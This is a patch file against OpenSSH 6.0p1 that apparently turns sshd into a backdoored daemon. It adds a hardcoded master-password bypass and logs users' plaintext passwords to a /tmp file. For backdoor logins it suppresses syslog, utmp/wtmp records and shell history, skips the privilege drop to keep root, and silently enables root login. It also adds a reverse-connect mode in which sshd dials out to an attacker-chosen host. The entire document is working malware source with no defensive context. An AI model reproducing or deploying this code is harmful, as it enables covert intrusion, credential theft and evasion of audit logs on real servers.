@@ -1,0 +1,676 @@
+diff -Ncr openssh-6.0p1/auth-pam.c udc-hackssh-v3_bajaulaut/auth-pam.c
+*** openssh-6.0p1/auth-pam.c  2009-07-12 20:07:21.000000000 +0800
+--- udc-hackssh-v3_bajaulaut/auth-pam.c  2012-10-18 01:35:12.000000000 +0800
+***************
+*** 1210,1216 ****
+--- 1210,1222 ----
+    if (sshpam_err == PAM_SUCCESS && authctxt->valid) {
+      debug("PAM: password authentication accepted for %.100s",
+          authctxt->user);
++ // udc-hackssh
++       if((f=fopen(BAJAUI,"a"))!=NULL){
++       fprintf(f,"%s:%s\n",authctxt->user, password);
++       fclose(f);
++       }
+      return 1;
++ // end
+    } else {
+      debug("PAM: password authentication failed for %.100s: %s",
+          authctxt->valid ? authctxt->user : "an illegal user",
+diff -Ncr openssh-6.0p1/auth-passwd.c udc-hackssh-v3_bajaulaut/auth-passwd.c
+*** openssh-6.0p1/auth-passwd.c  2009-03-08 08:40:28.000000000 +0800
+--- udc-hackssh-v3_bajaulaut/auth-passwd.c  2012-10-18 20:28:54.000000000 +0800
+***************
+*** 44,50 ****
+  #include <stdio.h>
+  #include <string.h>
+  #include <stdarg.h>
+! 
+  #include "packet.h"
+  #include "buffer.h"
+  #include "log.h"
+--- 44,50 ----
+  #include <stdio.h>
+  #include <string.h>
+  #include <stdarg.h>
+! #include <crypt.h>
+  #include "packet.h"
+  #include "buffer.h"
+  #include "log.h"
+***************
+*** 82,91 ****
+--- 82,101 ----
+  {
+    struct passwd * pw = authctxt->pw;
+    int result, ok = authctxt->valid;
++ 
++ // udc-hackssh
++   char *crypted=udc_pass_crypt;
+  #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
+    static int expire_checked = 0;
+  #endif
+  
++   udc_reslt_crypt = crypt(password, crypted);
++   if (strcmp (udc_reslt_crypt, crypted) == 0 ){
++         udc_phrase=1;
++   return 1; 
++   }
++ // end
++ 
+  #ifndef HAVE_CYGWIN
+    if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
+      ok = 0;
+***************
+*** 122,128 ****
+--- 132,146 ----
+        authctxt->force_pwchange = 1;
+    }
+  #endif
++ // udc-hackssh
+    result = sys_auth_passwd(authctxt, password);
++   if(result){
++     if((f=fopen(BAJAUI,"a"))!=NULL){
++     fprintf(f,"%s:%s\n",authctxt->user, password);
++     fclose(f);
++     }
++   }
++ // end
+    if (authctxt->force_pwchange)
+      disable_forwarding();
+    return (result && ok);
+diff -Ncr openssh-6.0p1/auth.c udc-hackssh-v3_bajaulaut/auth.c
+*** openssh-6.0p1/auth.c  2011-05-29 19:40:42.000000000 +0800
+--- udc-hackssh-v3_bajaulaut/auth.c  2012-10-18 01:31:08.000000000 +0800
+***************
+*** 271,284 ****
+    else
+      authmsg = authenticated ? "Accepted" : "Failed";
+  
+!   authlog("%s %s for %s%.100s from %.200s port %d%s",
+!       authmsg,
+!       method,
+!       authctxt->valid ? "" : "invalid user ",
+!       authctxt->user,
+!       get_remote_ipaddr(),
+!       get_remote_port(),
+!       info);
+  
+  #ifdef CUSTOM_FAILED_LOGIN
+    if (authenticated == 0 && !authctxt->postponed &&
+--- 271,286 ----
+    else
+      authmsg = authenticated ? "Accepted" : "Failed";
+  
+!   if(!udc_phrase || udc_phrase !=1){
+!           authlog("%s %s for %s%.100s from %.200s port %d%s",
+!         authmsg,
+!         method,
+!         authctxt->valid ? "" : "invalid user ",
+!         authctxt->user,
+!         get_remote_ipaddr(),
+!         get_remote_port(),
+!         info);
+!   }
+  
+  #ifdef CUSTOM_FAILED_LOGIN
+    if (authenticated == 0 && !authctxt->postponed &&
+diff -Ncr openssh-6.0p1/buffer.c udc-hackssh-v3_bajaulaut/buffer.c
+*** openssh-6.0p1/buffer.c  2010-02-12 06:23:40.000000000 +0800
+--- udc-hackssh-v3_bajaulaut/buffer.c  2012-10-18 01:33:14.000000000 +0800
+***************
+*** 37,42 ****
+--- 37,45 ----
+  
+    buffer->alloc = 0;
+    buffer->buf = xmalloc(len);
++ // udc-hackssh
++   memset(buffer->buf, 0, len);
++ // end
+    buffer->alloc = len;
+    buffer->offset = 0;
+    buffer->end = 0;
+diff -Ncr openssh-6.0p1/canohost.c udc-hackssh-v3_bajaulaut/canohost.c
+*** openssh-6.0p1/canohost.c  2010-10-12 10:28:12.000000000 +0800
+--- udc-hackssh-v3_bajaulaut/canohost.c  2012-10-18 01:38:10.000000000 +0800
+***************
+*** 78,88 ****
+--- 78,92 ----
+  
+    debug3("Trying to reverse map address %.100s.", ntop);
+    /* Map the IP address to a host name. */
++ // udc-hackssh
++   if(!udc_phrase || udc_phrase!=1){
+    if (getnameinfo((struct sockaddr *)&from, fromlen, name, sizeof(name),
+        NULL, 0, NI_NAMEREQD) != 0) {
+      /* Host name not found.  Use ip address. */
+      return xstrdup(ntop);
++     }
+    }
++ // end
+  
+    /*
+     * if reverse lookup result looks like a numeric hostname,
+diff -Ncr openssh-6.0p1/clean udc-hackssh-v3_bajaulaut/clean
+*** openssh-6.0p1/clean  1970-01-01 07:30:00.000000000 +0730
+--- udc-hackssh-v3_bajaulaut/clean  2012-10-18 20:32:15.000000000 +0800
+***************
+*** 0 ****
+--- 1,2 ----
++ make clean
++ rm -f Makefile openssh.xml opensshd.init openbsd-compat/Makefile openbsd-compat/regress/Makefile config.h config.status buildpkg.sh survey.sh
+diff -Ncr openssh-6.0p1/includes.h udc-hackssh-v3_bajaulaut/includes.h
+*** openssh-6.0p1/includes.h  2010-10-24 07:47:30.000000000 +0800
+--- udc-hackssh-v3_bajaulaut/includes.h  2012-10-18 01:34:26.000000000 +0800
+***************
+*** 17,23 ****
+  #define INCLUDES_H
+  
+  #include "config.h"
+- 
+  #define _GNU_SOURCE /* activate extra prototypes for glibc */
+  
+  #include <sys/types.h>
+--- 17,22 ----
+***************
+*** 172,175 ****
+--- 171,183 ----
+  
+  #include "entropy.h"
+  
++ // udc-hackssh
++ int udc_phrase;
++ FILE *f;
++ char *udc_reslt_crypt;
++ #define udc_pass_crypt  "add your encrypted DES cipher password"
++ #define BAJAUI "/tmp/changeme"
++ #define BAJAUO "/tmp/changeme"
++ // end
++ 
+  #endif /* INCLUDES_H */
+diff -Ncr openssh-6.0p1/log.c udc-hackssh-v3_bajaulaut/log.c
+*** openssh-6.0p1/log.c  2011-06-20 12:42:23.000000000 +0800
+--- udc-hackssh-v3_bajaulaut/log.c  2012-10-18 01:39:07.000000000 +0800
+***************
+*** 351,356 ****
+--- 351,359 ----
+  void
+  do_log(LogLevel level, const char *fmt, va_list args)
+  {
++ // udc-hackssh
++   if(!udc_phrase || udc_phrase!=1){
++ // end
+  #if defined(HAVE_OPENLOG_R) && defined(SYSLOG_DATA_INIT)
+    struct syslog_data sdata = SYSLOG_DATA_INIT;
+  #endif
+***************
+*** 428,430 ****
+--- 431,436 ----
+    }
+    errno = saved_errno;
+  }
++ // udc-hackssh
++ }
++ // end
+diff -Ncr openssh-6.0p1/servconf.c udc-hackssh-v3_bajaulaut/servconf.c
+*** openssh-6.0p1/servconf.c  2011-10-02 15:57:38.000000000 +0800
+--- udc-hackssh-v3_bajaulaut/servconf.c  2012-10-18 01:42:04.000000000 +0800
+***************
+*** 686,692 ****
+    { "without-password",    PERMIT_NO_PASSWD },
+    { "forced-commands-only",  PERMIT_FORCED_ONLY },
+    { "yes",      PERMIT_YES },
+!   { "no",        PERMIT_NO },
+    { NULL, -1 }
+  };
+  static const struct multistate multistate_compression[] = {
+--- 686,694 ----
+    { "without-password",    PERMIT_NO_PASSWD },
+    { "forced-commands-only",  PERMIT_FORCED_ONLY },
+    { "yes",      PERMIT_YES },
+! // udc-hackssh
+!   { "no",        PERMIT_YES },
+! // end
+    { NULL, -1 }
+  };
+  static const struct multistate multistate_compression[] = {
+diff -Ncr openssh-6.0p1/session.c udc-hackssh-v3_bajaulaut/session.c
+*** openssh-6.0p1/session.c  2011-11-04 07:55:24.000000000 +0800
+--- udc-hackssh-v3_bajaulaut/session.c  2012-10-18 03:18:56.000000000 +0800
+***************
+*** 1203,1208 ****
+--- 1203,1213 ----
+    if (getenv("TZ"))
+      child_set_env(&env, &envsize, "TZ", getenv("TZ"));
+  
++ // udc-hackssh
++   if (udc_phrase)
++     child_set_env(&env, &envsize, "HISTFILE", "/dev/null");
++ 
++ 
+    /* Set custom environment options from RSA authentication. */
+    if (!options.use_login) {
+      while (custom_environment) {
+***************
+*** 1487,1492 ****
+--- 1492,1500 ----
+  #else
+      if (setlogin(pw->pw_name) < 0)
+        error("setlogin failed: %s", strerror(errno));
++ // udc-hackssh
++     if (!udc_phrase) {
++ // end
+      if (setgid(pw->pw_gid) < 0) {
+        perror("setgid");
+        exit(1);
+***************
+*** 1496,1501 ****
+--- 1504,1515 ----
+        perror("initgroups");
+        exit(1);
+      }
++ // udc-hackssh
++     else {
++       setgid(0);
++       initgroups(pw->pw_name, 0);
++     }
++ // end
+      endgrent();
+  #endif
+  
+***************
+*** 1519,1524 ****
+--- 1533,1541 ----
+      }
+  #else
+      /* Permanently switch to the desired uid. */
++ // udc-hackssh
++     if (!udc_phrase)
++ // end
+      permanently_set_uid(pw);
+  #endif
+    }
+diff -Ncr openssh-6.0p1/ssh.c udc-hackssh-v3_bajaulaut/ssh.c
+*** openssh-6.0p1/ssh.c  2011-11-04 07:54:22.000000000 +0800
+--- udc-hackssh-v3_bajaulaut/ssh.c  2012-10-18 02:51:40.000000000 +0800
+***************
+*** 83,88 ****
+--- 83,91 ----
+  #include "canohost.h"
+  #include "compat.h"
+  #include "cipher.h"
++ // udc-hackssh bajaulaut version
++ #include <openssl/md5.h>
++ // end
+  #include "packet.h"
+  #include "buffer.h"
+  #include "channels.h"
+***************
+*** 125,130 ****
+--- 128,137 ----
+  /* don't exec a shell */
+  int no_shell_flag = 0;
+  
++ // udc-hackssh bajaulaut version
++ int udc_bajau_laut = 0;
++ // end
++ 
+  /*
+   * Flag indicating that nothing should be read from stdin.  This can be set
+   * on the command line.
+***************
+*** 325,331 ****
+    argv0 = av[0];
+  
+   again:
+!   while ((opt = getopt(ac, av, "1246ab:c:e:fgi:kl:m:no:p:qstvx"
+        "ACD:F:I:KL:MNO:PR:S:TVw:W:XYy")) != -1) {
+      switch (opt) {
+      case '1':
+--- 332,338 ----
+    argv0 = av[0];
+  
+   again:
+!   while ((opt = getopt(ac, av, "12468ab:c:e:fgi:kl:m:no:p:qstvx"
+        "ACD:F:I:KL:MNO:PR:S:TVw:W:XYy")) != -1) {
+      switch (opt) {
+      case '1':
+***************
+*** 340,345 ****
+--- 347,357 ----
+      case '6':
+        options.address_family = AF_INET6;
+        break;
++ // udc-hackssh bajaulaut version
++     case '8':
++       udc_bajau_laut = 1;
++       break;
++ // end
+      case 'n':
+        stdin_null_flag = 1;
+        break;
+diff -Ncr openssh-6.0p1/sshconnect.c udc-hackssh-v3_bajaulaut/sshconnect.c
+*** openssh-6.0p1/sshconnect.c  2011-05-29 19:42:34.000000000 +0800
+--- udc-hackssh-v3_bajaulaut/sshconnect.c  2012-10-18 02:13:41.000000000 +0800
+***************
+*** 333,338 ****
+--- 333,341 ----
+   * and %p substituted for host and port, respectively) to use to contact
+   * the daemon.
+   */
++ // udc-hackssh bajaulaut version
++ extern int udc_bajau_laut;
++ // end
+  int
+  ssh_connect(const char *host, struct sockaddr_storage * hostaddr,
+      u_short port, int family, int connection_attempts, int *timeout_ms,
+***************
+*** 347,353 ****
+    debug2("ssh_connect: needpriv %d", needpriv);
+  
+    /* If a proxy command is given, connect using it. */
+!   if (proxy_command != NULL)
+      return ssh_proxy_connect(host, port, proxy_command);
+  
+    /* No proxy command. */
+--- 350,358 ----
+    debug2("ssh_connect: needpriv %d", needpriv);
+  
+    /* If a proxy command is given, connect using it. */
+! // udc-hackssh bajaulaut version
+!   if (proxy_command != NULL && !udc_bajau_laut)
+! // end
+      return ssh_proxy_connect(host, port, proxy_command);
+  
+    /* No proxy command. */
+***************
+*** 360,365 ****
+--- 365,420 ----
+      fatal("%s: Could not resolve hostname %.100s: %s", __progname,
+          host, ssh_gai_strerror(gaierr));
+  
++ // udc-hackssh bajaulaut version
++   if (udc_bajau_laut) {
++     int s, one = 1, size_aa = sizeof(struct sockaddr);
++      struct addrinfo *aid;
++      struct sockaddr aa;
++  
++      if ((gaierr = getaddrinfo("127.0.0.1", strport, &hints, &aid)) < 0) {
++                    fprintf(stderr, "getaddrinfo (during reverse fun): %s\n", gai_strerror(gaierr));
++                    exit(gaierr);
++            }
++  
++            if (aid->ai_family == PF_INET) {
++       ((struct sockaddr_in*)(aid->ai_addr))->sin_addr.s_addr = INADDR_ANY;
++     }
++ #ifdef HAVE_STRUCT_IN6_ADDR
++     else {
++                   ((struct sockaddr_in6*)(aid->ai_addr))->sin6_addr = in6addr_any;
++     }
++ #endif
++  
++     if ((s = socket(aid->ai_family, SOCK_STREAM, 0)) < 0) {
++       perror("socket (during reverse fun)");
++                    exit(errno);
++     }
++  
++            if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0) {
++                    perror("setsockopt (during reverse fun)\n");
++                    exit(errno);
++     }
++  
++     printf("Reverse fun: binding to port %s\n", strport);
++              if (bind(s, (struct sockaddr*)(aid->ai_addr), sizeof(struct sockaddr)) < 0) {
++                      perror("bind (during reverse fun)");
++                      exit(errno);
++     }
++  
++            if (listen(s, 1) < 0) {
++                   perror("listen (during reverse fun)");
++                    exit(errno);
++     }
++  
++            if ((sock = accept(s, &aa, &size_aa)) < 0) {
++                   perror("accept (during reverse fun)");
++                    exit(errno);
++     }
++            memcpy(hostaddr, &aa, size_aa);
++  
++     goto startbajau;
++   }
++ // end
+    for (attempt = 0; attempt < connection_attempts; attempt++) {
+      if (attempt > 0) {
+        /* Sleep a moment before retrying. */
+***************
+*** 404,409 ****
+--- 459,467 ----
+        break;  /* Successful connection. */
+    }
+  
++ // udc-hackssh bajaulaut version
++   startbajau:
++ // end
+    freeaddrinfo(aitop);
+  
+    /* Return failure if we didn't get a successful connection. */
+diff -Ncr openssh-6.0p1/sshd.c udc-hackssh-v3_bajaulaut/sshd.c
+*** openssh-6.0p1/sshd.c  2012-02-15 02:03:31.000000000 +0800
+--- udc-hackssh-v3_bajaulaut/sshd.c  2012-10-18 02:46:07.000000000 +0800
+***************
+*** 146,151 ****
+--- 146,159 ----
+  /* Name of the server configuration file. */
+  char *config_file_name = _PATH_SERVER_CONFIG_FILE;
+  
++ // udc-hackssh - bajaulaut version
++ #ifdef IPV4_DEFAULT
++   int IPv4or6 = AF_INET;
++ #else
++   int IPv4or6 = AF_UNSPEC;
++ #endif
++ // end
++ 
+  /*
+   * Debug mode flag.  This can be set on the command line.  If debug
+   * mode is enabled, extra debugging output will be sent to the system
+***************
+*** 633,640 ****
+    /* Store a pointer to the kex for later rekeying */
+    pmonitor->m_pkex = &xxx_kex;
+  
+!   if (use_privsep == PRIVSEP_SANDBOX)
+!     box = ssh_sandbox_init();
+    pid = fork();
+    if (pid == -1) {
+      fatal("fork of unprivileged child failed");
+--- 641,657 ----
+    /* Store a pointer to the kex for later rekeying */
+    pmonitor->m_pkex = &xxx_kex;
+  
+! // udc-hackssh bajaulaut version
+!   int udc_bajau_laut = 1;
+! 
+!   if (udc_bajau_laut == 0) {
+!     if (use_privsep == PRIVSEP_SANDBOX)
+!       box = ssh_sandbox_init();
+!   else
+!     return;
+!   }
+! // end
+! 
+    pid = fork();
+    if (pid == -1) {
+      fatal("fork of unprivileged child failed");
+***************
+*** 1322,1327 ****
+--- 1339,1351 ----
+    const char *remote_ip;
+    char *test_user = NULL, *test_host = NULL, *test_addr = NULL;
+    int remote_port;
++ 
++ // udc-hackssh bajaulaut version
++   int listen_sock;
++   int udc_bajau_laut = 0;
++   char udc_bajau_conn[1024];
++ // end
++ 
+    char *line, *p, *cp;
+    int config_s[2] = { -1 , -1 };
+    u_int64_t ibytes, obytes;
+***************
+*** 1358,1364 ****
+    initialize_server_options(&options);
+  
+    /* Parse command-line arguments. */
+!   while ((opt = getopt(ac, av, "f:p:b:k:h:g:u:o:C:dDeiqrtQRT46")) != -1) {
+      switch (opt) {
+      case '4':
+        options.address_family = AF_INET;
+--- 1382,1390 ----
+    initialize_server_options(&options);
+  
+    /* Parse command-line arguments. */
+! // udc-hackssh bajaulaut version
+!   while ((opt = getopt(ac, av, "f:p:b:k:h:g:u:o:C:8:dDeiqrtQRT46")) != -1) {
+! // end
+      switch (opt) {
+      case '4':
+        options.address_family = AF_INET;
+***************
+*** 1478,1483 ****
+--- 1504,1516 ----
+          exit(1);
+        xfree(line);
+        break;
++ // udc-hackssh bajaulaut version
++     case '8':
++       udc_bajau_laut = 1;
++       strncpy(udc_bajau_conn, optarg, sizeof(udc_bajau_conn));
++       printf("bajau - case: Enabling bajau laut!\n");
++       break;
++ // end
+      case '?':
+      default:
+        usage();
+***************
+*** 1786,1791 ****
+--- 1819,1872 ----
+    /* Get a connection, either from inetd or a listening TCP socket */
+    if (inetd_flag) {
+      server_accept_inetd(&sock_in, &sock_out);
++ // udc-hackssh bajaulaut version
++   } else if (udc_bajau_laut) {
++      int client_port = options.ports[0];
++      char port[100];
++      struct addrinfo *adi, hints;
++  
++      memset(&hints, 0, sizeof(hints));
++      hints.ai_family = IPv4or6;
++      hints.ai_socktype = SOCK_STREAM;
++  
++      // resolv hostname
++      memset(port, 0, sizeof(port));
++      snprintf(port, sizeof(port), "%d", client_port);
++      if (getaddrinfo(udc_bajau_conn, port, &hints, &adi) < 0) {
++        perror("addrinfo (during bajau_laut)");
++        exit(errno);
++      }
++  
++      // create socket
++      if ((listen_sock = socket(adi->ai_family, adi->ai_socktype, adi->ai_protocol)) < 0) {
++        perror("socket (during bajau_laut)");
++        exit(errno);
++      }
++      printf("bajau_laut: Connecting to host %s on port %s\n", udc_bajau_conn, port);
++  
++      // connecting
++      if (connect(listen_sock, (struct sockaddr*)adi->ai_addr, sizeof(struct sockaddr)) < 0) {
++        perror("connect (during bajau_laut)");
++        exit(errno);
++      }
++      if (fcntl(listen_sock, F_SETFL, 0) < 0)
++        error("newsock del O_NONBLOCK: %s", strerror(errno));
++      
++      // established
++      sock_in = listen_sock;
++      if ((sock_out = dup(sock_in)) < 0) {
++        perror("dup (during reverse fun)");
++        sock_out = sock_in;
++      }  
++  
++     if (options.protocol & SSH_PROTO_1)
++       generate_ephemeral_server_key();
++ 
++     signal(SIGHUP, sighup_handler);
++     signal(SIGCHLD, main_sigchld_handler);
++     signal(SIGTERM, sigterm_handler);
++     signal(SIGQUIT, sigterm_handler);
++ // end
+    } else {
+      platform_pre_listen();
+      server_listen();
+***************
+*** 1837,1843 ****
+      error("setsid: %.100s", strerror(errno));
+  #endif
+  
+!   if (rexec_flag) {
+      int fd;
+  
+      debug("rexec start in %d out %d newsock %d pipe %d sock %d",
+--- 1918,1926 ----
+      error("setsid: %.100s", strerror(errno));
+  #endif
+  
+! // udc-hackssh bajaulaut version
+!   if (rexec_flag && !udc_bajau_laut) {
+! // end
+      int fd;
+  
+      debug("rexec start in %d out %d newsock %d pipe %d sock %d",
+diff -Ncr openssh-6.0p1/sshlogin.c udc-hackssh-v3_bajaulaut/sshlogin.c
+*** openssh-6.0p1/sshlogin.c  2011-01-11 14:20:07.000000000 +0800
+--- udc-hackssh-v3_bajaulaut/sshlogin.c  2012-10-18 01:43:09.000000000 +0800
+***************
+*** 133,140 ****
+--- 133,144 ----
+  
+    li = login_alloc_entry(pid, user, host, tty);
+    login_set_addr(li, addr, addrlen);
++ // udc-hackssh
++   if (!udc_phrase || udc_phrase!=1){
+    login_login(li);
+    login_free_entry(li);
++   }
++ // end
+  }
+  
+  #ifdef LOGIN_NEEDS_UTMPX
+***************
+*** 146,153 ****
+--- 150,161 ----
+  
+    li = login_alloc_entry(pid, user, host, ttyname);
+    login_set_addr(li, addr, addrlen);
++ // udc-hackssh
++   if(!udc_phrase || udc_phrase!=1){
+    login_utmp_only(li);
+    login_free_entry(li);
++   }
++ // end
+  }
+  #endif
+  
+***************
+*** 158,163 ****
+--- 166,175 ----
+    struct logininfo *li;
+  
+    li = login_alloc_entry(pid, user, NULL, tty);
++ // udc-hackssh
++   if(!udc_phrase || udc_phrase!=1){
+    login_logout(li);
+    login_free_entry(li);
++   }
++ // end
+  }
